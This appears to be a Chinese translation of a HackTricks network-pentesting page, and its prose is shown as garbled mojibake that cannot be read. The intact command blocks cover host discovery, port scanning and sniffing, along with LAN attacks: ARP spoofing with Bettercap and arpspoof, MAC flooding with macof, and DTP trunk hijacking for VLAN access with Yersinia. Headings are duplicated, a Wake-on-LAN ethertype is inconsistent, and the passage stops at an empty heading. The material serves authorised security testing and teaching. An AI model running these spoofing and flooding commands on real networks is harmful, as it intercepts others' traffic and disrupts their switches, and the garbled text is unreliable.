# ç½‘ç»œæ¸—é€æµ‹è¯•

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[NFTæ”¶è—å“](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨**Twitter**ä¸Šå…³æ³¨æˆ‘ä»¬ ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**èµé‡‘æç¤º**ï¼š**æ³¨å†Œ**Intigritiï¼Œè¿™æ˜¯ä¸€å®¶ç”±é»‘å®¢åˆ›å»ºçš„é«˜çº§**èµé‡‘å¹³å°**ï¼ç«‹å³åŠ å…¥æˆ‘ä»¬ï¼Œè®¿é—®[**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)ï¼Œå¼€å§‹èµšå–é«˜è¾¾**$100,000**çš„èµé‡‘ï¼

{% embed url="https://go.intigriti.com/hacktricks" %}

## ä»å¤–éƒ¨å‘ç°ä¸»æœº

è¿™å°†æ˜¯ä¸€ä¸ªå…³äºå¦‚ä½•æ‰¾åˆ°**ä»äº’è”ç½‘å“åº”çš„IPåœ°å€**çš„**ç®€çŸ­éƒ¨åˆ†**ã€‚\
åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ‚¨æœ‰ä¸€äº›**IPèŒƒå›´**ï¼ˆç”šè‡³å¯èƒ½æœ‰å‡ ä¸ª**èŒƒå›´**ï¼‰ï¼Œæ‚¨åªéœ€æ‰¾åˆ°**å“ªäº›IPåœ°å€æ­£åœ¨å“åº”**ã€‚

### ICMP

è¿™æ˜¯å‘ç°ä¸»æœºæ˜¯å¦å¯åŠ¨çš„**æœ€ç®€å•**å’Œ**æœ€å¿«**çš„æ–¹æ³•ã€‚\
æ‚¨å¯ä»¥å°è¯•å‘é€ä¸€äº›**ICMP**æ•°æ®åŒ…å¹¶**æœŸæœ›å“åº”**ã€‚æœ€ç®€å•çš„æ–¹æ³•å°±æ˜¯å‘é€ä¸€ä¸ª**å›æ˜¾è¯·æ±‚**å¹¶æœŸæœ›å“åº”ã€‚æ‚¨å¯ä»¥ä½¿ç”¨ç®€å•çš„`ping`æˆ–ä½¿ç”¨`fping`æ¥å¤„ç†**èŒƒå›´**ã€‚\
æ‚¨è¿˜å¯ä»¥ä½¿ç”¨**nmap**å‘é€å…¶ä»–ç±»å‹çš„ICMPæ•°æ®åŒ…ï¼ˆè¿™å°†é¿å…å¸¸è§çš„ICMPå›æ˜¾è¯·æ±‚-å“åº”çš„è¿‡æ»¤å™¨ï¼‰ã€‚
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### TCPç«¯å£å‘ç°

é€šå¸¸ä¼šå‘ç°å„ç§ç±»å‹çš„ICMPæ•°æ®åŒ…è¢«è¿‡æ»¤ã€‚å› æ­¤ï¼Œæ‚¨å¯ä»¥åšçš„å°±æ˜¯**å°è¯•æŸ¥æ‰¾å¼€æ”¾çš„ç«¯å£**æ¥æ£€æŸ¥ä¸»æœºæ˜¯å¦åœ¨çº¿ã€‚æ¯å°ä¸»æœºæœ‰**65535ä¸ªç«¯å£**ï¼Œå› æ­¤ï¼Œå¦‚æœæ‚¨æœ‰ä¸€ä¸ªâ€œå¤§â€èŒƒå›´ï¼Œæ‚¨**æ— æ³•**æµ‹è¯•æ¯ä¸ªä¸»æœºçš„**æ¯ä¸ªç«¯å£**æ˜¯å¦å¼€æ”¾ï¼Œè¿™å°†èŠ±è´¹å¤ªå¤šæ—¶é—´ã€‚\
å› æ­¤ï¼Œæ‚¨éœ€è¦ä¸€ä¸ª**å¿«é€Ÿç«¯å£æ‰«æå·¥å…·**ï¼ˆ[masscan](https://github.com/robertdavidgraham/masscan)ï¼‰å’Œä¸€ä¸ª**å¸¸ç”¨ç«¯å£åˆ—è¡¨**ï¼š
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
### HTTPç«¯å£å‘ç°

è¿™åªæ˜¯ä¸€ä¸ªTCPç«¯å£å‘ç°ï¼Œå½“ä½ æƒ³è¦**ä¸“æ³¨äºå‘ç°HTTPæœåŠ¡**æ—¶éå¸¸æœ‰ç”¨ï¼š
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### UDPç«¯å£å‘ç°

æ‚¨è¿˜å¯ä»¥å°è¯•æ£€æŸ¥ä¸€äº›**UDPç«¯å£æ˜¯å¦å¼€æ”¾**ï¼Œä»¥å†³å®šæ˜¯å¦åº”è¯¥**æ›´åŠ å…³æ³¨**ä¸€ä¸ª**ä¸»æœº**ã€‚ç”±äºUDPæœåŠ¡é€šå¸¸ä¸ä¼šå¯¹å¸¸è§„ç©ºçš„UDPæ¢æµ‹æ•°æ®åŒ…åšå‡ºä»»ä½•å“åº”ï¼Œå› æ­¤å¾ˆéš¾åˆ¤æ–­ç«¯å£æ˜¯è¢«è¿‡æ»¤è¿˜æ˜¯å¼€æ”¾çš„ã€‚æœ€ç®€å•çš„æ–¹æ³•æ˜¯å‘é€ä¸è¿è¡ŒæœåŠ¡ç›¸å…³çš„æ•°æ®åŒ…ï¼Œç”±äºæ‚¨ä¸çŸ¥é“è¿è¡Œçš„æ˜¯å“ªç§æœåŠ¡ï¼Œå› æ­¤åº”è¯¥æ ¹æ®ç«¯å£å·å°è¯•æœ€æœ‰å¯èƒ½çš„æœåŠ¡ï¼š
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
åœ¨æ­¤ä¹‹å‰æå‡ºçš„nmapå‘½ä»¤å°†æµ‹è¯•**/24**èŒƒå›´å†…æ¯ä¸ªä¸»æœºçš„**å‰1000ä¸ªUDPç«¯å£**ï¼Œä½†å³ä½¿å¦‚æ­¤ï¼Œè¿™å°†èŠ±è´¹**>20åˆ†é’Ÿ**ã€‚å¦‚æœéœ€è¦**æ›´å¿«çš„ç»“æœ**ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨[**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner)ï¼š`./udp-proto-scanner.pl 199.66.11.53/24`ã€‚è¿™å°†å‘å®ƒä»¬çš„**é¢„æœŸç«¯å£**å‘é€è¿™äº›**UDPæ¢é’ˆ**ï¼ˆå¯¹äº/24èŒƒå›´ï¼Œè¿™å°†åªéœ€1åˆ†é’Ÿï¼‰ï¼š_DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike,ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### SCTPç«¯å£å‘ç°
```bash
#Probably useless, but it's pretty fast, why not trying?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## æ¸—é€æµ‹è¯•Wifi

åœ¨è¿™é‡Œï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°ä¸€ä»½å…³äºæ‰€æœ‰ä¼—æ‰€å‘¨çŸ¥çš„Wifiæ”»å‡»æ–¹æ³•çš„è¯¦ç»†æŒ‡å—ï¼š

{% content-ref url="../pentesting-wifi/" %}
[pentesting-wifi](../pentesting-wifi/)
{% endcontent-ref %}

## ä»å†…éƒ¨å‘ç°ä¸»æœº

å¦‚æœæ‚¨åœ¨ç½‘ç»œå†…éƒ¨ï¼Œæ‚¨å°†é¦–å…ˆè¦åšçš„äº‹æƒ…ä¹‹ä¸€æ˜¯**å‘ç°å…¶ä»–ä¸»æœº**ã€‚æ ¹æ®æ‚¨å¯ä»¥/æƒ³è¦åˆ¶é€ çš„**å™ªéŸ³é‡**çš„å¤šå°‘ï¼Œå¯ä»¥æ‰§è¡Œä¸åŒçš„æ“ä½œï¼š

### è¢«åŠ¨

æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å·¥å…·è¢«åŠ¨åœ°å‘ç°è¿æ¥ç½‘ç»œå†…éƒ¨çš„ä¸»æœºï¼š
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### ä¸»åŠ¨

è¯·æ³¨æ„ï¼Œ[_**ä»å¤–éƒ¨å‘ç°ä¸»æœº**_](./#discovering-hosts-from-the-outside)ï¼ˆ_TCP/HTTP/UDP/SCTPç«¯å£å‘ç°_ï¼‰ä¸­è¯„è®ºçš„æŠ€æœ¯ä¹Ÿå¯ä»¥åœ¨è¿™é‡Œ**åº”ç”¨**ã€‚\
ä½†æ˜¯ï¼Œç”±äºæ‚¨ä¸å…¶ä»–ä¸»æœºåœ¨**åŒä¸€ç½‘ç»œ**ä¸­ï¼Œæ‚¨å¯ä»¥åš**æ›´å¤šçš„äº‹æƒ…**ï¼š
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### ä¸»åŠ¨ ICMP

è¯·æ³¨æ„ï¼Œåœ¨â€œä»å¤–éƒ¨å‘ç°ä¸»æœºâ€ä¸­è¯„è®ºçš„æŠ€æœ¯ï¼ˆ[_**ICMP**_](./#icmp)ï¼‰ä¹Ÿå¯ä»¥**åº”ç”¨åœ¨è¿™é‡Œ**ã€‚\
ä½†æ˜¯ï¼Œç”±äºæ‚¨ä¸å…¶ä»–ä¸»æœºåœ¨**åŒä¸€ç½‘ç»œ**ä¸­ï¼Œæ‚¨å¯ä»¥åš**æ›´å¤šçš„äº‹æƒ…**ï¼š

- å¦‚æœæ‚¨**ping**ä¸€ä¸ª**å­ç½‘å¹¿æ’­åœ°å€**ï¼Œåˆ™pingåº”è¯¥åˆ°è¾¾**æ¯ä¸ªä¸»æœº**ï¼Œå®ƒä»¬å¯èƒ½ä¼š**å“åº”**ç»™**æ‚¨**ï¼š`ping -b 10.10.5.255`
- å¯¹**ç½‘ç»œå¹¿æ’­åœ°å€**è¿›è¡Œpingï¼Œç”šè‡³å¯ä»¥æ‰¾åˆ°**å…¶ä»–å­ç½‘å†…çš„ä¸»æœº**ï¼š`ping -b 255.255.255.255`
- ä½¿ç”¨`nmap`çš„`-PE`ã€`-PP`ã€`-PM`æ ‡å¿—æ‰§è¡Œä¸»æœºå‘ç°ï¼Œåˆ†åˆ«å‘é€**ICMPv4 echo**ã€**æ—¶é—´æˆ³**å’Œ**å­ç½‘æ©ç è¯·æ±‚**ï¼š`nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`

### **è¿œç¨‹å”¤é†’**

è¿œç¨‹å”¤é†’ç”¨äºé€šè¿‡**ç½‘ç»œæ¶ˆæ¯**æ‰“å¼€è®¡ç®—æœºã€‚ç”¨äºæ‰“å¼€è®¡ç®—æœºçš„é­”æœ¯æ•°æ®åŒ…åªæ˜¯ä¸€ä¸ªæ•°æ®åŒ…ï¼Œå…¶ä¸­æä¾›äº†ä¸€ä¸ª**MACç›®æ ‡**ï¼Œç„¶ååœ¨åŒä¸€ä¸ªæ•°æ®åŒ…ä¸­**é‡å¤16æ¬¡**ã€‚\
ç„¶åï¼Œè¿™ç§ç±»å‹çš„æ•°æ®åŒ…é€šå¸¸å‘é€åˆ°**ä»¥å¤ªç½‘0x0842**æˆ–**UDPæ•°æ®åŒ…åˆ°ç«¯å£9**ã€‚\
å¦‚æœæœªæä¾›**\[MAC]**ï¼Œåˆ™æ•°æ®åŒ…å°†å‘é€åˆ°**å¹¿æ’­ä»¥å¤ªç½‘**ï¼ˆå¹¿æ’­MACå°†è¢«é‡å¤ï¼‰ã€‚
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0847
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## æ‰«æä¸»æœº

ä¸€æ—¦æ‚¨å‘ç°äº†æ‰€æœ‰æ‚¨æƒ³è¦æ·±å…¥æ‰«æçš„IPï¼ˆå¤–éƒ¨æˆ–å†…éƒ¨ï¼‰ï¼Œå¯ä»¥æ‰§è¡Œä¸åŒçš„æ“ä½œã€‚

### TCP

* **å¼€æ”¾**ç«¯å£ï¼š_SYN --> SYN/ACK --> RST_
* **å…³é—­**ç«¯å£ï¼š_SYN --> RST/ACK_
* **è¿‡æ»¤**ç«¯å£ï¼š_SYN --> \[æ— å“åº”]_
* **è¿‡æ»¤**ç«¯å£ï¼š_SYN --> ICMPæ¶ˆæ¯_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

æœ‰ä¸¤ç§é€‰é¡¹æ¥æ‰«æ UDP ç«¯å£ï¼š

- å‘é€ä¸€ä¸ª **UDP æ•°æ®åŒ…** å¹¶æ£€æŸ¥å“åº”ä¸­çš„ _**ICMP ä¸å¯è¾¾**_ å¦‚æœç«¯å£æ˜¯ **å…³é—­**ï¼ˆåœ¨ä¸€äº›æƒ…å†µä¸‹ ICMP å°†ä¼šè¢« **è¿‡æ»¤**ï¼Œå› æ­¤æ‚¨å°†æ— æ³•æ”¶åˆ°ç«¯å£æ˜¯å…³é—­è¿˜æ˜¯æ‰“å¼€çš„ä¿¡æ¯ï¼‰ã€‚
- å‘é€ä¸€ä¸ª **æ ¼å¼åŒ–æ•°æ®æŠ¥** æ¥å¼•å‘ä¸€ä¸ª **æœåŠ¡** çš„å“åº”ï¼ˆä¾‹å¦‚ï¼ŒDNSã€DHCPã€TFTP ç­‰ï¼Œå¦‚åœ¨ _nmap-payloads_ ä¸­åˆ—å‡ºçš„ï¼‰ã€‚å¦‚æœæ‚¨æ”¶åˆ°ä¸€ä¸ª **å“åº”**ï¼Œé‚£ä¹ˆç«¯å£æ˜¯ **æ‰“å¼€**ã€‚

**Nmap** å°†ä½¿ç”¨ "-sV" **æ··åˆ** è¿™ä¸¤ç§é€‰é¡¹ï¼ˆUDP æ‰«æéå¸¸æ…¢ï¼‰ï¼Œä½†è¯·æ³¨æ„ UDP æ‰«ææ¯” TCP æ‰«ææ…¢ï¼š
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### SCTPæ‰«æ

**SCTPï¼ˆæµæ§åˆ¶ä¼ è¾“åè®®ï¼‰**è¢«è®¾è®¡ç”¨äºä¸**TCPï¼ˆä¼ è¾“æ§åˆ¶åè®®ï¼‰**å’Œ**UDPï¼ˆç”¨æˆ·æ•°æ®æŠ¥åè®®ï¼‰**ä¸€èµ·ä½¿ç”¨ã€‚å…¶ä¸»è¦ç›®çš„æ˜¯åœ¨IPç½‘ç»œä¸Šä¾¿æ·åœ°ä¼ è¾“ç”µè¯æ•°æ®ï¼Œåæ˜ äº†**ä¿¡ä»¤ç³»ç»Ÿ7ï¼ˆSS7ï¼‰**ä¸­è®¸å¤šå¯é æ€§ç‰¹æ€§ã€‚**SCTP**æ˜¯**SIGTRAN**åè®®ç³»åˆ—çš„æ ¸å¿ƒç»„ä»¶ï¼Œæ—¨åœ¨åœ¨IPç½‘ç»œä¸Šä¼ è¾“SS7ä¿¡å·ã€‚

å„ç§æ“ä½œç³»ç»Ÿï¼ˆå¦‚**IBM AIX**ã€**Oracle Solaris**ã€**HP-UX**ã€**Linux**ã€**Cisco IOS**å’Œ**VxWorks**ï¼‰æä¾›å¯¹**SCTP**çš„æ”¯æŒï¼Œè¡¨æ˜å®ƒåœ¨ç”µä¿¡å’Œç½‘ç»œé¢†åŸŸå¾—åˆ°äº†å¹¿æ³›æ¥å—å’Œåº”ç”¨ã€‚

nmapæä¾›äº†ä¸¤ç§ä¸åŒçš„SCTPæ‰«æï¼š_-sY_å’Œ_-sZ_
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### IDSå’ŒIPSè§„é¿

{% content-ref url="ids-evasion.md" %}
[ids-evasion.md](ids-evasion.md)
{% endcontent-ref %}

### **æ›´å¤šnmapé€‰é¡¹**

{% content-ref url="nmap-summary-esp.md" %}
[nmap-summary-esp.md](nmap-summary-esp.md)
{% endcontent-ref %}

### æ­ç¤ºå†…éƒ¨IPåœ°å€

**é…ç½®é”™è¯¯çš„è·¯ç”±å™¨ã€é˜²ç«å¢™å’Œç½‘ç»œè®¾å¤‡**æœ‰æ—¶ä¼šä½¿ç”¨**éå…¬å…±æºåœ°å€**å“åº”ç½‘ç»œæ¢æµ‹ã€‚å¯ä»¥ä½¿ç”¨**tcpdump**æ¥è¯†åˆ«æµ‹è¯•è¿‡ç¨‹ä¸­ä»ç§æœ‰åœ°å€æ¥æ”¶çš„æ•°æ®åŒ…ã€‚å…·ä½“æ¥è¯´ï¼Œåœ¨Kali Linuxä¸Šï¼Œå¯ä»¥åœ¨ä»å…¬å…±äº’è”ç½‘è®¿é—®çš„**eth2æ¥å£**ä¸Šæ•è·æ•°æ®åŒ…ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœæ‚¨çš„è®¾ç½®ä½äºNATæˆ–é˜²ç«å¢™åï¼Œè¿™äº›æ•°æ®åŒ…å¾ˆå¯èƒ½ä¼šè¢«è¿‡æ»¤æ‰ã€‚
```bash
tcpdump â€“nt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## å—…æ¢

é€šè¿‡æŸ¥çœ‹æ•è·çš„å¸§å’Œæ•°æ®åŒ…ï¼Œæ‚¨å¯ä»¥äº†è§£IPèŒƒå›´ã€å­ç½‘å¤§å°ã€MACåœ°å€å’Œä¸»æœºåç­‰ç»†èŠ‚ã€‚å¦‚æœç½‘ç»œé…ç½®ä¸æ­£ç¡®æˆ–äº¤æ¢æœºæ¶æ„å‹åŠ›è¿‡å¤§ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡è¢«åŠ¨ç½‘ç»œå—…æ¢æ•è·æ•æ„Ÿææ–™ã€‚

å¦‚æœäº¤æ¢å¼ä»¥å¤ªç½‘ç½‘ç»œé…ç½®æ­£ç¡®ï¼Œæ‚¨åªä¼šçœ‹åˆ°å¹¿æ’­å¸§å’Œå‘é€åˆ°æ‚¨MACåœ°å€çš„æ•°æ®ã€‚ 

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
ä¸€ä¸ªäººä¹Ÿå¯ä»¥é€šè¿‡Wiresharkä½œä¸ºGUIå®æ—¶åœ¨SSHä¼šè¯ä¸­ä»è¿œç¨‹è®¡ç®—æœºæ•è·æ•°æ®åŒ…ã€‚
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### Bettercap

### Bettercap
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

æ˜¾è€Œæ˜“è§ã€‚

### æ•è·å‡­è¯

æ‚¨å¯ä»¥ä½¿ç”¨ç±»ä¼¼[https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz)çš„å·¥å…·æ¥ä»pcapæ–‡ä»¶æˆ–å®æ—¶æ¥å£ä¸­è§£æå‡­è¯ã€‚

## å±€åŸŸç½‘æ”»å‡»

### ARPæ¬ºéª—

ARPæ¬ºéª—æ˜¯æŒ‡å‘é€ä¼ªé€ çš„ARPå“åº”ï¼ŒæŒ‡ç¤ºæŸå°æœºå™¨çš„IPå…·æœ‰æˆ‘ä»¬è®¾å¤‡çš„MACåœ°å€ã€‚ç„¶åï¼Œå—å®³è€…å°†æ›´æ”¹ARPè¡¨ï¼Œå¹¶åœ¨æ¯æ¬¡æƒ³è¦è”ç³»ä¼ªé€ IPæ—¶ä¸æˆ‘ä»¬çš„æœºå™¨è”ç³»ã€‚

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
#### **Arpspoof**

#### **Arpspoof**
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### MAC Floodæ”»å‡» - CAMè¡¨æº¢å‡º

é€šè¿‡å‘é€å¤§é‡å…·æœ‰ä¸åŒæºMACåœ°å€çš„æ•°æ®åŒ…æ¥æº¢å‡ºäº¤æ¢æœºçš„CAMè¡¨ã€‚å½“CAMè¡¨å·²æ»¡æ—¶ï¼Œäº¤æ¢æœºä¼šå¼€å§‹è¡¨ç°å¾—åƒé›†çº¿å™¨ä¸€æ ·ï¼ˆå¹¿æ’­æ‰€æœ‰æµé‡ï¼‰ã€‚
```bash
macof -i <interface>
```
### 802.1Q VLAN / DTP æ”»å‡»

#### åŠ¨æ€å¹²çº¿

**åŠ¨æ€å¹²çº¿åè®® (DTP)** è¢«è®¾è®¡ä¸ºä¸€ç§é“¾è·¯å±‚åè®®ï¼Œç”¨äºä¿ƒè¿›å¹²çº¿çš„è‡ªåŠ¨ç³»ç»Ÿï¼Œå…è®¸äº¤æ¢æœºè‡ªåŠ¨é€‰æ‹©ç«¯å£è¿›å…¥å¹²çº¿æ¨¡å¼ (Trunk) æˆ–éå¹²çº¿æ¨¡å¼ã€‚éƒ¨ç½² **DTP** é€šå¸¸è¢«è§†ä¸ºç½‘ç»œè®¾è®¡ä¸ä½³çš„æŒ‡æ ‡ï¼Œå¼ºè°ƒåªåœ¨å¿…è¦æ—¶æ‰‹åŠ¨é…ç½®å¹²çº¿å¹¶ç¡®ä¿é€‚å½“çš„æ–‡æ¡£è®°å½•çš„é‡è¦æ€§ã€‚

é»˜è®¤æƒ…å†µä¸‹ï¼Œäº¤æ¢æœºç«¯å£è®¾ç½®ä¸ºåŠ¨æ€è‡ªåŠ¨æ¨¡å¼ï¼Œè¿™æ„å‘³ç€å¦‚æœé‚»è¿‘äº¤æ¢æœºå‘å‡ºæç¤ºï¼Œå®ƒä»¬å°†å‡†å¤‡å¥½å¯åŠ¨å¹²çº¿ã€‚å½“æ¸—é€æµ‹è¯•äººå‘˜æˆ–æ”»å‡»è€…è¿æ¥åˆ°äº¤æ¢æœºå¹¶å‘é€ DTP æ¬²æœ›å¸§æ—¶ï¼Œä¼šå‡ºç°å®‰å…¨é—®é¢˜ï¼Œè¿«ä½¿ç«¯å£è¿›å…¥å¹²çº¿æ¨¡å¼ã€‚æ­¤æ“ä½œä½¿æ”»å‡»è€…èƒ½å¤Ÿé€šè¿‡ STP å¸§åˆ†ææšä¸¾ VLANï¼Œå¹¶é€šè¿‡è®¾ç½®è™šæ‹Ÿæ¥å£æ¥è§„é¿ VLAN åˆ†å‰²ã€‚

è®¸å¤šäº¤æ¢æœºé»˜è®¤æƒ…å†µä¸‹å­˜åœ¨ DTPï¼Œå¯¹æ‰‹å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹æ¨¡ä»¿äº¤æ¢æœºçš„è¡Œä¸ºï¼Œä»è€Œè®¿é—®æ‰€æœ‰ VLAN ä¸­çš„æµé‡ã€‚è„šæœ¬ [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan) ç”¨äºç›‘è§†æ¥å£ï¼Œæ˜¾ç¤ºäº¤æ¢æœºå¤„äºé»˜è®¤ã€å¹²çº¿ã€åŠ¨æ€ã€è‡ªåŠ¨æˆ–è®¿é—®æ¨¡å¼ä¸­çš„å“ªç§çŠ¶æ€ï¼Œåè€…æ˜¯å”¯ä¸€å…ç–« VLAN è·³è·ƒæ”»å‡»çš„é…ç½®ã€‚è¯¥å·¥å…·è¯„ä¼°äº†äº¤æ¢æœºçš„æ¼æ´çŠ¶æ€ã€‚

å¦‚æœå‘ç°ç½‘ç»œæ¼æ´ï¼Œå¯ä»¥ä½¿ç”¨ _**Yersinia**_ å·¥å…·é€šè¿‡ DTP åè®®â€œå¯ç”¨å¹²çº¿â€ï¼Œä»è€Œè§‚å¯Ÿæ¥è‡ªæ‰€æœ‰ VLAN çš„æ•°æ®åŒ…ã€‚
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](<../../.gitbook/assets/image (646) (1).png>)

è¦æšä¸¾VLANï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨è„šæœ¬[DTPHijacking.py](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py)ç”ŸæˆDTP Desirableå¸§ã€‚åˆ‡å‹¿åœ¨ä»»ä½•æƒ…å†µä¸‹ä¸­æ–­è„šæœ¬ã€‚å®ƒæ¯ä¸‰ç§’æ³¨å…¥ä¸€ä¸ªDTP Desirableã€‚äº¤æ¢æœºä¸ŠåŠ¨æ€åˆ›å»ºçš„å¹²é“é€šé“åªèƒ½å­˜æ´»äº”åˆ†é’Ÿã€‚äº”åˆ†é’Ÿåï¼Œå¹²é“ä¼šæ–­å¼€è¿æ¥ã€‚
```
sudo python3 DTPHijacking.py --interface eth0
```
æˆ‘æƒ³æŒ‡å‡º**Access/Desirable (0x03)**è¡¨ç¤ºDTPå¸§æ˜¯Desirableç±»å‹ï¼Œå‘Šè¯‰ç«¯å£åˆ‡æ¢åˆ°Trunkæ¨¡å¼ã€‚è€Œ**802.1Q/802.1Q (0xa5)**è¡¨ç¤º**802.1Q**å°è£…ç±»å‹ã€‚

é€šè¿‡åˆ†æSTPå¸§ï¼Œ**æˆ‘ä»¬äº†è§£åˆ°VLAN 30å’ŒVLAN 60çš„å­˜åœ¨**ã€‚

<figure><img src="../../.gitbook/assets/image (18) (1).png" alt=""><figcaption></figcaption></figure>

#### æ”»å‡»ç‰¹å®šVLAN

